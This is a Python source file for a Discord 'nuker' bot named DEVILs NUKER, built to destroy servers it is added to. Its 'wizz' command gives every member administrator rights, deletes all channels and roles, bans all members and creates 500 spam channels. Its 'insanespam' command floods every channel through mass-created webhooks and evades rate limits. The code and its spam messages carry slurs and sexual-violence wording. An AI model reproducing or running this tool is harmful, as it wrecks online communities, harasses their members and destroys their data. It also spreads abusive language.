import discord
from discord.ext import commands
import asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
from discord import Permissions
from colorama import Fore, Style
import os 


prefix = ("$")


RICHY = discord.Client()
RICHY = commands.Bot(description='RAPE', command_prefix=prefix,)





RICHY.remove_command('help')



@RICHY.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='RICHY OP')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/829355879848607775/841192543177277450/image0.gif')
    embed.set_footer(text='RICHY | DEVILs NUKER')
    embed.add_field(name='___**YOUR SERVER IS DEAD**___', value='```THIS IS THE ULTIMATE KILLER THAT I EVER CREATED```')
    embed.add_field(name='___**COMMANDS**___', value='**wizz (starts the Murder), stopnigga (stops the Procedure of murder)**')
    embed.add_field(name='___**INSANESPAM**___', value='**unstoppable webhookspam**')
    embed.add_field(name='___**botinfo**___', value='**shows bots info**')
    embed.add_field(name='**DEVILs NUKER**', value='```KILLS THE SERVER AND DESTROYS YOUR MOBILE```')
    await ctx.send(embed=embed) 
  
  
@RICHY.command()
async def botinfo(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='DEVILs NUKER v2 | BOT INFO')
    embed.set_footer(text='DEVILs NUKER v2 | BOT INFO')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/829355879848607775/841192543177277450/image0.gif')
    embed.add_field(name='___**BOT INFO**___', value='```ALL THE INFO ABOUT BOT```')
    embed.add_field(name='___**DEVELOPER**___', value='<:botdev:841043220191641651> **insane X richy <\> xBRV#8366**')
    embed.add_field(name='**language**', value='''<:python:841043124116652032> **PYTHON 3.8.2**''')
    embed.add_field(name='___**DEVELOPER INFO**___', value='''<:botdev:841043220191641651> https://dsc.bio/richy 
    click on the link to get richys info''')
    await ctx.send(embed=embed) 

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone wizzed by deadlynuker',
         'embeds':[
          {'title':'DEVILsNUKER',
           'tts':'true',
           'description':'.',
           'url':'https://instagram.com/_jotarokujo_123',
           'color':randcolor,
           'fields':[
            {'name':'DEVILsNUKER',
             'value':'.'},
            {'name':'DEVILsNUKER',
             'value':'.'},
            {'name':'DEVILsNUKER',
             'value':'.'},
            {'name':'.',
             'value':'.'}],
           'author':{'name':'DEVILsNUKER',
            'url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif',
            'icon_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
           'footer':{'text':'DEVILsNUKER by RichY',
            'icon_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
           'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
           'thumbnail':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}},
          {'url':'https://instagram.com/_jotarokujo_123',
           'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}},
          {'url':'https://instagram.com/_jotarokujo_123',
           'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}},
          {'url':'https://instagram.com/_jotarokujo_123',
           'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}}],
         'username':'WIZZED BY DEVILs Nuker',
         'avatar_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@RICHY.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def insanespam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by DEVILsNuker')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


  
  
     
SPAM_CHANNEL =  ["deadlynuker runs you" , "Get fucked" , "deadlynuker op" , "wizzed your server","wizzed by deadly","wizzed by richy","Get wizzed nigga","wizzed by deadlynuker","Wizzed by Deadlynuker","Wizzed by Richy","Wizzed By DeadlyNuker","Wizzed by DeadlyNuker","Wizzed By DeadlyNuker"]
SPAM_MESSAGE = ["@everyone **Wizzed By DeadlyNuker**"]



@RICHY.event
async def on_ready():
  print(Fore.RED + r'''

 ______              _ _  
(______)            (_) | 
 _     _ _____ _   _ _| | 
| |   | | ___ | | | | | | 
| |__/ /| ____|\ V /| | | 
|_____/ |_____) \_/ |_|\_)
                         

                                       
                                       
    FASTEST NUKE BOT EVER
1 ; Insane webhook spam
2 ; wizz2  
3 ; spam Roles  
4 ; Wizz
5 ; Del Emojis
6 ; Nuke Server           
''' + Style.RESET_ALL)
 
@RICHY.command()
@commands.is_owner()
async def stopnigga(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@RICHY.command()
async def wizz(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("lil#9690")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully banned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not banned." + Fore.RESET)
    await guild.create_text_channel("Wizzed by deadlynuker")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@RICHY.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
        
print("DEADLY NUKER IS READY!!! lmao")

#paste your bots token here xD


RICHY.run(token, bot=True)
